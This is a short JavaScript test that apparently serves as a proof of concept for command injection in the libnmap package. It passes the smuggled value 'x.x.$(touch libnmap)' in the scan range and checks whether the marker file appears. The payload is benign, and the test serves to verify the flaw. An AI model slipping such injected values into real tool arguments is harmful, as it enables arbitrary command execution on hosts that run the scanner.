test("Command Injection in libnmap", (done) => {
  expect.assertions(2);
  const nmap = require("libnmap");
  const fs = require("fs");
  const path = "./libnmap";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const opts = {
    range: ["scanme.nmap.org", "x.x.$(touch libnmap)"],
  };
  nmap.scan(opts, function (err, report) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
